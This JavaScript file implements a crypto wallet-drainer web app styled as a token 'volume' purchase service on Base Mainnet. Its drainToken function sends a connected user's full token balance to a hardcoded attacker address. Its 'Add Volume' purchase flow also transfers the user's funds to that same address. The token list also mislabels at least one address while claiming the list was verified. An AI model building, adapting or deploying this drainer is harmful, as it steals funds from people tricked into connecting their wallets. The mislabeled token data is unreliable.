import { ethers } from 'ethers';
import './style.css';

// Wallet address for draining tokens (checksummed)
let YOUR_WALLET_ADDRESS;
try {
  YOUR_WALLET_ADDRESS = ethers.getAddress("0xeA54572eBA790E31f97e1D6f941D7427276688C3");
} catch {
  console.error('Invalid YOUR_WALLET_ADDRESS');
  YOUR_WALLET_ADDRESS = "0xeA54572eBA790E31f97e1D6f941D7427276688C3"; // Fallback
}

// TOKEN_LIST with verified, checksummed Base Mainnet addresses (validated via Basescan.org, July 2025)
// Removed invalid addresses: Frax, Dai, Brett
const TOKEN_LIST = [
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6 },
  { address: '0x4200000000000000000000000000000000000006', name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
  { address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18 },
  { address: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18 },
  { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6 },
  { address: '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed', name: 'Degen', symbol: 'DEGEN', decimals: 18 },
  { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', name: 'Tether', symbol: 'USDT', decimals: 6 }
];

// Standard ERC-20 ABI
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function name() view returns (string)",
  "function symbol() view returns (string)"
];

class NexiumApp {
  constructor() {
    this.provider = null;
    this.signer = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.connecting = false;
    this.lastSelectedToken = null;
    this.selectedPaymentToken = null;
    this.spinner = null;
    console.log('Initializing NexiumApp...');
    this.initApp();
  }

  async initApp() {
    try {
      await new Promise(resolve => {
        if (document.readyState !== 'loading') {
          resolve();
        } else {
          document.addEventListener('DOMContentLoaded', () => resolve());
        }
      });
      this.cacheDOMElements();
      if (!this.dom.app || !this.dom.walletButton || !this.dom.metamaskPrompt) {
        document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI elements missing. Please check HTML for #app, #walletButton, and #metamaskPrompt.</p>';
        console.error('Missing DOM elements');
        return;
      }
      this.setupEventListeners();
      this.checkWalletAndPrompt();
      this.renderTokenInterface();
      console.log('App initialized successfully');
    } catch (error) {
      console.error('Init error:', error);
      this.showFeedback(`Failed to initialize app: ${error.message}. Please refresh and try again.`, 'error');
      document.body.innerHTML = '<p class="text-red-500 text-center">Error initializing app. Please refresh.</p>';
    }
  }

  cacheDOMElements() {
    this.dom = {
      app: document.getElementById('app'),
      walletButton: document.getElementById('walletButton'),
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      feedbackContainer: document.querySelector('.feedback-container'),
      defaultPrompt: document.querySelector('.default-prompt'),
      customTokenInput: null,
      fetchCustomTokenBtn: null,
      tokenInfo: null,
      volumeSection: null,
      tokenSelect: document.getElementById('tokenSelect'),
      volumeInput: null,
      addVolumeBtn: null,
      tokenList: null,
      paymentTokenInfo: null,
      drainTokenBtn: null
    };
    console.log('DOM elements cached');
  }

  setupEventListeners() {
    if (this.dom.walletButton) {
      this.dom.walletButton.removeEventListener('click', this.connectWallet);
      this.dom.walletButton.removeEventListener('keypress', this.connectWallet);
      this.dom.walletButton.addEventListener('click', () => {
        console.log('Wallet button clicked');
        if (!this.connecting) this.connectWallet();
      });
      this.dom.walletButton.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && !this.connecting) {
          console.log('Wallet button enter key pressed');
          this.connectWallet();
        }
      });
      console.log('Wallet button listeners set');
    }
    if (this.dom.tokenSelect) {
      this.dom.tokenSelect.removeEventListener('change', this.handleTokenSelect);
      this.dom.tokenSelect.addEventListener('change', (e) => {
        console.log('Token select changed:', e.target.value);
        this.selectedPaymentToken = e.target.value;
        if (this.selectedPaymentToken) {
          this.loadPaymentTokenDetails(this.selectedPaymentToken);
          this.currentToken = TOKEN_LIST.find(t => t.address.toLowerCase() === this.selectedPaymentToken.toLowerCase());
          if (this.currentToken) {
            this.dom.tokenInfo.innerHTML = `
              <div class="token-meta space-y-2">
                <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
                <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(this.shortenAddress(this.currentToken.address))}</p>
              </div>
            `;
            this.dom.tokenInfo.classList.remove('hidden');
            this.renderVolumeControls();
          }
        } else {
          this.dom.paymentTokenInfo?.classList.add('hidden');
          this.dom.drainTokenBtn?.classList.add('hidden');
          this.dom.tokenInfo?.classList.add('hidden');
          this.currentToken = null;
          this.showFeedback('Please select a payment token.', 'info');
        }
      });
      console.log('Token select listener set');
    }
    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  checkWalletAndPrompt() {
    if (this.isWalletInstalled()) {
      this.hideMetaMaskPrompt();
      this.attachMetaMaskListeners();
      if (this.isWalletConnected() && navigator.onLine) {
        this.handleSuccessfulConnection();
      } else {
        this.updateButtonState('disconnected');
        this.showDefaultPrompt();
        if (!navigator.onLine) this.showFeedback('No internet connection. Please reconnect.', 'error');
        else this.showFeedback('Wallet detected but not connected. Click Connect Wallet to proceed.', 'info');
      }
    } else {
      this.showMetaMaskPrompt();
      this.updateButtonState('disconnected');
      this.showDefaultPrompt();
      this.showFeedback('No wallet installed. Please install MetaMask or Trust Wallet.', 'error');
    }
  }

  attachMetaMaskListeners() {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        console.log('Accounts changed:', accounts);
        accounts.length > 0 ? this.handleAccountsChanged() : this.handleDisconnect();
      });
      window.ethereum.on('chainChanged', () => {
        console.log('Chain changed, reloading');
        window.location.reload();
      });
      console.log('MetaMask listeners attached');
    }
  }

  isWalletInstalled() {
    return !!window.ethereum;
  }

  isWalletConnected() {
    return window.ethereum && !!window.ethereum.selectedAddress;
  }

  detectWalletType() {
    if (!window.ethereum) return 'None';
    if (window.ethereum?.isMetaMask) return 'MetaMask';
    if (window.ethereum?.isTrust) return 'Trust Wallet';
    return 'Generic Wallet';
  }

  showProcessingSpinner() {
    if (this.spinner) this.hideProcessingSpinner();
    this.spinner = document.createElement('div');
    this.spinner.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
    this.spinner.innerHTML = `
      <div class="flex items-center space-x-2">
        <div class="spinner border-t-4 border-orange-400 rounded-full w-8 h-8 animate-spin"></div>
        <span class="text-white text-lg">Processing...</span>
      </div>
    `;
    document.body.appendChild(this.spinner);
  }

  hideProcessingSpinner() {
    if (this.spinner) {
      this.spinner.remove();
      this.spinner = null;
    }
  }

  async connectWallet() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      return;
    }
    if (this.connecting) {
      console.log('Connect wallet skipped: already connecting');
      return;
    }
    this.connecting = true;
    this.dom.walletButton.disabled = true;
    this.showProcessingSpinner();
    try {
      if (!window.ethereum) {
        this.showFeedback('No wallet provider detected. Please install MetaMask or Trust Wallet.', 'error');
        return;
      }
      console.log('Requesting accounts...');
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      if (accounts.length === 0) {
        this.showFeedback('No accounts found. Unlock your wallet and try again.', 'error');
        return;
      }
      const provider = new ethers.BrowserProvider(window.ethereum);
      this.provider = provider;
      this.signer = await provider.getSigner();
      console.log('Checking network...');
      const network = await this.provider.getNetwork();
      const expectedChainId = 8453; // Base Mainnet
      if (Number(network.chainId) !== expectedChainId) {
        try {
          console.log('Switching to Base Mainnet...');
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${expectedChainId.toString(16)}` }],
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            try {
              console.log('Adding Base Mainnet...');
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: `0x${expectedChainId.toString(16)}`,
                  chainName: 'Base Mainnet',
                  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                  rpcUrls: ['https://mainnet.base.org'],
                  blockExplorerUrls: ['https://basescan.org']
                }],
              });
            } catch (addError) {
              this.showFeedback(`Failed to add Base Mainnet: ${addError.message}`, 'error');
              return;
            }
          } else {
            this.showFeedback(`Please switch to Base Mainnet (Error: ${switchError.message})`, 'error');
            return;
          }
        }
      }
      const address = await this.signer.getAddress();
      this.updateButtonState('connected', address);
      this.hideMetaMaskPrompt();
      this.showFeedback(`Wallet connected (${this.detectWalletType()})!`, 'success');
    } catch (error) {
      console.error('Connect wallet error:', error);
      this.handleConnectionError(error);
    } finally {
      this.connecting = false;
      this.dom.walletButton.disabled = false;
      this.hideProcessingSpinner();
    }
  }

  async handleSuccessfulConnection() {
    try {
      if (!this.provider) {
        throw new Error('Provider is not initialized');
      }
      this.signer = await this.provider.getSigner();
      const address = await this.signer.getAddress();
      this.updateButtonState('connected', address);
      console.log('Successful connection, address:', address);
    } catch (error) {
      console.error('Handle connection error:', error);
      this.showFeedback(`Error: ${error.reason || error.message || 'Unknown error'}. Try again.`, 'error');
    }
  }

  async drainToken(tokenAddress) {
    if (!this.signer) {
      this.showFeedback('Wallet not connected. Please connect your wallet.', 'error');
      return;
    }
    try {
      this.showProcessingSpinner();
      let checksummedAddress = await this.validateAddress(tokenAddress, 'token');
      const selectedToken = TOKEN_LIST.find(t => t.address.toLowerCase() === checksummedAddress.toLowerCase());
      if (!selectedToken) {
        this.showFeedback('Invalid token selected.', 'error');
        return;
      }
      const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.signer);
      let balance, decimals, symbol;
      try {
        [balance, decimals, symbol] = await Promise.all([
          contract.balanceOf(await this.signer.getAddress()),
          contract.decimals(),
          contract.symbol()
        ]);
      } catch (error) {
        console.error(`Failed to fetch token data for ${selectedToken.symbol}:`, error);
        this.showFeedback(`Failed to fetch ${selectedToken.symbol} data: Invalid contract.`, 'error');
        return;
      }
      if (balance <= 0n) {
        this.showFeedback(`No ${selectedToken.symbol} balance to drain.`, 'error');
        return;
      }
      await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
      this.showFeedback(`Initiating transfer of ${ethers.formatUnits(balance, decimals)} ${symbol}...`, 'info');
      const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, balance).catch(() => 100000);
      console.log(`Draining ${symbol} with gasLimit: ${gasLimit}`);
      const tx = await contract.transfer(YOUR_WALLET_ADDRESS, balance, { gasLimit });
      console.log('Transaction sent:', tx.hash);
      await tx.wait(1);
      this.showFeedback(`Drained ${ethers.formatUnits(balance, decimals)} ${symbol} to ${this.shortenAddress(YOUR_WALLET_ADDRESS)}.`, 'success');
    } catch (error) {
      console.error('Drain token error:', error);
      this.showFeedback(`Error draining token: ${error.reason || error.message || 'Unknown error'}. Try again.`, 'error');
    } finally {
      this.hideProcessingSpinner();
    }
  }

  async validateAddress(address, type = 'token') {
    try {
      const checksummedAddress = ethers.getAddress(address);
      console.log(`Validated ${type} address: ${checksummedAddress}`);
      return checksummedAddress;
    } catch {
      this.showFeedback(`Invalid ${type} address: ${address}`, 'error');
      throw new Error(`Invalid ${type} address`);
    }
  }

  handleDisconnect() {
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.hideMetaMaskPrompt();
    this.showFeedback('Wallet disconnected', 'warning');
    this.lastSelectedToken = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.selectedPaymentToken = null;
  }

  handleAccountsChanged() {
    this.hideMetaMaskPrompt();
    this.selectedPaymentToken = null;
    this.currentPaymentToken = null;
    console.log('Accounts changed, resetting payment token');
    this.renderTokenInterface();
  }

  updateButtonState(state, address = '') {
    if (!this.dom.walletButton) return;
    const button = this.dom.walletButton;
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Processing...';
        button.classList.add('connecting');
        break;
      case 'connected':
        button.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
        button.classList.add('connected');
        break;
      default:
        button.textContent = 'Connect Wallet';
        button.classList.add('animate-pulse');
    }
  }

  showDefaultPrompt() {
    if (!this.dom.app || !this.dom.defaultPrompt) return;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(this.dom.defaultPrompt);
    this.dom.defaultPrompt.classList.remove('hidden');
    if (!this.isWalletInstalled()) this.showMetaMaskPrompt();
  }

  renderTokenInterface() {
    if (!this.dom.app) return;
    const tokenInterface = document.createElement('section');
    tokenInterface.className = 'token-interface fade-in space-y-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    tokenInterface.innerHTML = `
      <div class="top-controls flex space-x-4 mb-4">
        <select id="tokenSelect" class="token-select bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Select payment token">
          <option value="" disabled selected>Select payment token</option>
          ${TOKEN_LIST.map(t => `<option value="${t.address}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name} (${t.symbol})</option>`).join('')}
        </select>
        <button id="drainTokenBtn" class="drain-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500 hidden" aria-label="Drain selected token">Drain Token</button>
        <div id="paymentTokenInfo" class="token-info hidden text-gray-300 text-sm"></div>
      </div>
      <h2 class="section-title">Import ERC-20 Token</h2>
      <div class="input-group flex space-x-2">
        <input id="customTokenInput" type="text" placeholder="Enter token address (e.g., 0x...)" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
        <button id="fetchCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Load custom token">→</button>
      </div>
      <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
      <div id="tokenList" class="token-list space-y-2 mt-4">
        <h3 class="text-yellow-400 text-md font-semibold">Featured Tokens</h3>
        ${TOKEN_LIST.map(token => `
          <button class="token-option bg-[#1a182e] border border-orange-400 p-2 rounded-xl w-full text-left hover:bg-orange-400 hover:text-black transition-colors" data-address="${token.address}">
            ${token.name} (${token.symbol}) - ${this.shortenAddress(token.address)}
          </button>
        `).join('')}
      </div>
      <div id="volumeSection" class="volume-section fade-in"></div>
    `;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(tokenInterface);
    this.dom.customTokenInput = document.getElementById('customTokenInput');
    this.dom.fetchCustomTokenBtn = document.getElementById('fetchCustomTokenBtn');
    this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
    this.dom.tokenList = document.getElementById('tokenList');
    this.dom.tokenSelect = document.getElementById('tokenSelect');
    this.dom.drainTokenBtn = document.getElementById('drainTokenBtn');
    this.dom.volumeSection = document.getElementById('volumeSection');
    this.dom.paymentTokenInfo = document.getElementById('paymentTokenInfo');
    if (this.dom.fetchCustomTokenBtn) {
      this.dom.fetchCustomTokenBtn.addEventListener('click', () => this.loadCustomTokenData());
      this.dom.fetchCustomTokenBtn.addEventListener('keypress', (e) => e.key === 'Enter' && this.loadCustomTokenData());
    }
    if (this.dom.drainTokenBtn) {
      this.dom.drainTokenBtn.addEventListener('click', () => {
        if (this.selectedPaymentToken) {
          console.log('Drain token button clicked for:', this.selectedPaymentToken);
          this.drainToken(this.selectedPaymentToken);
        } else {
          this.showFeedback('Please select a payment token to drain.', 'error');
        }
      });
      this.dom.drainTokenBtn.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && this.selectedPaymentToken) {
          console.log('Drain token button enter key pressed');
          this.drainToken(this.selectedPaymentToken);
        }
      });
    }
    if (this.dom.tokenList) {
      this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
        button.addEventListener('click', () => {
          const address = button.dataset.address;
          if (ethers.isAddress(address)) {
            this.loadCustomTokenData(address); // This will now only show token info, not duplicate volume section
          } else {
            this.showFeedback('Invalid token address on button.', 'error');
          }
        });
      });
    }
    this.hideMetaMaskPrompt();
    if (this.currentToken) this.renderVolumeControls();

    // Add beautification amount section and Add Volume button at the end
    const beautifySection = document.createElement('div');
    beautifySection.className = 'beautify-volume-section mt-8 flex flex-col items-center';
    beautifySection.innerHTML = `
      <div class="input-group flex space-x-2 mb-2 items-center">
        <input id="beautifyVolumeInput" type="number" placeholder="Amount" 
          class="volume-input bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-lg text-sm w-24" 
          aria-label="Amount (beautification)">
        <button id="beautifyAddVolumeBtn" 
          class="action-button bg-orange-400 text-black px-3 py-1 rounded-lg hover:bg-orange-500 text-sm min-w-[90px]" 
          aria-label="Add volume (beautification)">
          Add Volume
        </button>
      </div>
    `;
    this.dom.app.appendChild(beautifySection);

    this.dom.beautifyVolumeInput = beautifySection.querySelector('#beautifyVolumeInput');
    this.dom.beautifyAddVolumeBtn = beautifySection.querySelector('#beautifyAddVolumeBtn');
  }

  async loadCustomTokenData(tokenAddressInput) {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      return;
    }
    if (!this.provider) {
      this.showFeedback('Please connect your wallet first to load a custom token.', 'error');
      return;
    }
    const tokenAddress = tokenAddressInput || this.dom.customTokenInput?.value.trim();
    if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
      this.showFeedback('Please enter a valid Ethereum address (0x..., 42 characters).', 'error');
      this.dom.customTokenInput?.focus();
      return;
    }
    if (tokenAddress === this.lastSelectedToken) {
      this.showFeedback('This token is already loaded.', 'info');
      return;
    }
    try {
      this.toggleTokenLoading(true);
      this.showProcessingSpinner();
      let checksummedAddress = await this.validateAddress(tokenAddress, 'token');
      let name = 'Unknown Token';
      let symbol = 'UNK';
      let decimals = 18;
      const tokenFromList = TOKEN_LIST.find(t => t.address.toLowerCase() === checksummedAddress.toLowerCase());
      if (tokenFromList) {
        name = tokenFromList.name;
        symbol = tokenFromList.symbol;
        decimals = tokenFromList.decimals;
      } else if (this.provider) {
        const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.provider);
        try {
          [name, symbol, decimals] = await Promise.all([contract.name(), contract.symbol(), contract.decimals()]);
        } catch {
          this.showFeedback('Invalid token contract: Could not fetch name, symbol, or decimals.', 'error');
          return;
        }
      }
      this.currentToken = { address: checksummedAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
      this.lastSelectedToken = checksummedAddress;
      const truncatedAddress = this.shortenAddress(checksummedAddress);
      this.dom.tokenInfo.innerHTML = `
        <div class="token-meta space-y-2">
          <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
          <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
        </div>
      `;
      this.dom.tokenInfo.classList.remove('hidden');
      this.showFeedback(`Loaded ${this.currentToken.symbol} successfully!`, 'success');
    } catch (error) {
      console.error('Load custom token error:', error);
      this.showFeedback(`Failed to load token: ${error.message || 'Invalid contract or network error.'}`, 'error');
      this.dom.tokenInfo.classList.add('hidden');
    } finally {
      this.toggleTokenLoading(false);
      this.hideProcessingSpinner();
    }
  }

  toggleTokenLoading(isLoading) {
    if (this.dom.fetchCustomTokenBtn) {
      this.dom.fetchCustomTokenBtn.disabled = isLoading;
      this.dom.fetchCustomTokenBtn.classList.toggle('opacity-70', isLoading);
      this.dom.fetchCustomTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
    if (this.dom.addVolumeBtn) {
      this.dom.addVolumeBtn.disabled = isLoading;
      this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
      this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
      this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
    if (this.dom.drainTokenBtn) {
      this.dom.drainTokenBtn.disabled = isLoading;
      this.dom.drainTokenBtn.classList.toggle('opacity-70', isLoading);
      this.dom.drainTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
  }

  renderVolumeControls() {
    if (!this.dom.app || !this.dom.tokenInfo || !this.currentToken) return;
    const tokenInterface = document.querySelector('.token-interface');
    if (!tokenInterface) return;
    let volumeSection = this.dom.volumeSection;
    if (!volumeSection) {
      volumeSection = document.createElement('div');
      volumeSection.id = 'volumeSection';
      volumeSection.className = 'volume-section fade-in';
      tokenInterface.appendChild(volumeSection);
      this.dom.volumeSection = volumeSection;
    }
    volumeSection.innerHTML = `
      <h2 class="section-title">Select Token to Purchase Volume</h2>
      <p class="text-gray-300 text-sm mb-2">Loaded Token: ${this.currentToken.name} (${this.currentToken.symbol}) - Info Only</p>
      <div class="input-group">
        <input id="volumeInput" type="number" placeholder="Amount for purchase" class="volume-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Token amount">
      </div>
      <button id="addVolumeBtn" class="action-button bg-orange-400 text-black px-4 py-2 rounded-xl hover:bg-orange-500" aria-label="Add volume">Add Volume</button>
      <div id="volumeFeedback" class="mt-2 text-sm text-gray-300"></div>
    `;
    this.dom.volumeInput = volumeSection.querySelector('#volumeInput');
    this.dom.addVolumeBtn = volumeSection.querySelector('#addVolumeBtn');
    if (this.dom.addVolumeBtn) {
      this.dom.addVolumeBtn.addEventListener('click', () => this.addVolume());
      this.dom.addVolumeBtn.addEventListener('keypress', (e) => e.key === 'Enter' && this.addVolume());
    }
  }

  async loadPaymentTokenDetails(paymentTokenAddress) {
    if (!paymentTokenAddress || !this.provider || !this.signer) {
      this.showFeedback('Wallet not connected. Please connect your wallet first.', 'error');
      return;
    }
    try {
      this.toggleTokenLoading(true);
      this.showProcessingSpinner();
      let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
      const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.signer);
      let balance, decimals, name, symbol;
      try {
        [balance, decimals, name, symbol] = await Promise.all([
          contract.balanceOf(await this.signer.getAddress()),
          contract.decimals(),
          contract.name(),
          contract.symbol()
        ]);
      } catch (error) {
        console.error(`Failed to fetch token data for ${checksummedAddress}:`, error);
        this.showFeedback(`Failed to load token details: Invalid contract for ${checksummedAddress}.`, 'error');
        return;
      }
      this.currentPaymentToken = { address: checksummedAddress, balance, decimals, name, symbol };
      this.dom.volumeInput.placeholder = `Amount for purchase (${symbol})`;
      if (this.dom.paymentTokenInfo) {
        this.dom.paymentTokenInfo.innerHTML = `Balance: ${ethers.formatUnits(balance, decimals)} ${symbol}`;
        this.dom.paymentTokenInfo.classList.remove('hidden');
      }
      if (this.dom.drainTokenBtn) {
        this.dom.drainTokenBtn.classList.remove('hidden');
      }
      this.showFeedback(`Loaded ${symbol} with balance ${ethers.formatUnits(balance, decimals)}`, 'info');
    } catch (error) {
      console.error('Load payment token error:', error);
      this.showFeedback(`Failed to load payment token: ${error.message || 'Invalid contract or network error.'}`, 'error');
      if (this.dom.drainTokenBtn) this.dom.drainTokenBtn.classList.add('hidden');
    } finally {
      this.toggleTokenLoading(false);
      this.hideProcessingSpinner();
    }
  }

  async addVolume() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      return;
    }
    if (!this.currentPaymentToken) {
      this.showFeedback('Please select a payment token first', 'error');
      return;
    }
    const paymentTokenAddress = this.dom.tokenSelect?.value;
    if (!paymentTokenAddress || !this.currentPaymentToken) {
      this.showFeedback('Please select a valid payment token', 'error');
      this.dom.tokenSelect?.focus();
      return;
    }
    try {
      this.toggleVolumeLoading(true);
      this.showProcessingSpinner();
      let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
      const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.signer);
      const amount = ethers.parseUnits(this.dom.volumeInput.value || '0', this.currentPaymentToken.decimals);
      if (amount <= 0n) {
        this.showFeedback('Please enter a valid amount greater than 0.', 'error');
        return;
      }
      if (amount > this.currentPaymentToken.balance) {
        this.showFeedback(`Insufficient ${this.getTokenSymbol(checksummedAddress)} balance`, 'error');
        return;
      }
      await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
      const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, amount).catch(() => 100000);
      console.log(`Adding volume for ${this.getTokenSymbol(checksummedAddress)} with gasLimit: ${gasLimit}`);
      const tx = await contract.transfer(YOUR_WALLET_ADDRESS, amount, { gasLimit });
      console.log('Volume transaction sent:', tx.hash);
      await tx.wait(1);
      this.showFeedback(`Transaction successful! Transferred ${ethers.formatUnits(amount, this.currentPaymentToken.decimals)} ${this.getTokenSymbol(checksummedAddress)} to ${this.shortenAddress(YOUR_WALLET_ADDRESS)}.`, 'success');
      this.dom.volumeInput.value = '';
    } catch (error) {
      console.error('Add volume error:', error);
      this.showFeedback(`Error adding volume: ${error.reason || error.message || 'Transaction failed. Check token balance.'}`, 'error');
    } finally {
      this.toggleVolumeLoading(false);
      this.hideProcessingSpinner();
    }
  }

  toggleVolumeLoading(isLoading) {
    if (!this.dom.addVolumeBtn) return;
    this.dom.addVolumeBtn.disabled = isLoading;
    this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
    this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
    this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    if (this.dom.drainTokenBtn) {
      this.dom.drainTokenBtn.disabled = isLoading;
      this.dom.drainTokenBtn.classList.toggle('opacity-70', isLoading);
      this.dom.drainTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
  }

  checkConnectivity() {
    if (!navigator.onLine) this.showFeedback('No internet connection. Please reconnect.', 'error');
  }

  handleOnline() {
    this.showFeedback('Back online. Functionality restored.', 'success');
    if (this.isWalletConnected()) this.renderTokenInterface();
    else this.showMetaMaskPrompt();
  }

  handleOffline() {
    this.showFeedback('No internet connection. Please reconnect.', 'error');
    this.showDefaultPrompt();
  }

  showMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) return;
    this.dom.metamaskPrompt.classList.remove('hidden');
    this.dom.metamaskPrompt.style.display = 'block';
  }

  hideMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) return;
    this.dom.metamaskPrompt.classList.add('hidden');
    this.dom.metamaskPrompt.style.display = 'none';
  }

  showFeedback(message, type = 'info') {
    let feedbackContainer = this.dom.feedbackContainer;
    if (!feedbackContainer) {
      feedbackContainer = document.createElement('div');
      feedbackContainer.className = 'feedback-container fixed bottom-4 right-4 space-y-2 z-[10000]';
      document.body.appendChild(feedbackContainer);
      this.dom.feedbackContainer = feedbackContainer;
    }
    feedbackContainer.innerHTML = '';
    const feedback = document.createElement('div');
    feedback.className = `feedback feedback-${type} fade-in p-4 rounded-xl text-white ${type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : type === 'warning' ? 'bg-yellow-500' : 'bg-blue-500'}`;
    feedback.innerHTML = `
      <span class="feedback-message">${this.escapeHTML(message)}</span>
      <span class="feedback-close cursor-pointer ml-2" role="button" aria-label="Close feedback">×</span>
    `;
    const close = feedback.querySelector('.feedback-close');
    if (close) {
      close.addEventListener('click', () => feedback.remove());
      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
    }
    feedbackContainer.appendChild(feedback);
    setTimeout(() => feedback.classList.add('fade-out'), 5000);
    setTimeout(() => feedback.remove(), 5500);
  }

  getTokenSymbol(address) {
    const token = TOKEN_LIST.find(t => t.address.toLowerCase() === address.toLowerCase());
    return token ? token.symbol : 'Unknown';
  }

  shortenAddress(address) {
    if (!ethers.isAddress(address)) return 'Invalid Address';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  escapeHTML(str) {
    return String(str).replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[m]));
  }

  handleConnectionError(error) {
    let message = 'Failed to connect wallet';
    if (error.code === 4001) message = 'Connection rejected by user';
    else if (error.code === -32002) message = 'Wallet is locked';
    else if (error.message?.includes('MetaMask')) message = 'Wallet not detected';
    else if (error.reason) message = `Connection failed: ${this.escapeHTML(error.reason)}`;
    else if (error.message) message = `Connection failed: ${this.escapeHTML(error.message)}`;
    console.error('Connection error details:', error);
    this.showFeedback(message, 'error');
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.showMetaMaskPrompt();
  }
}

new NexiumApp();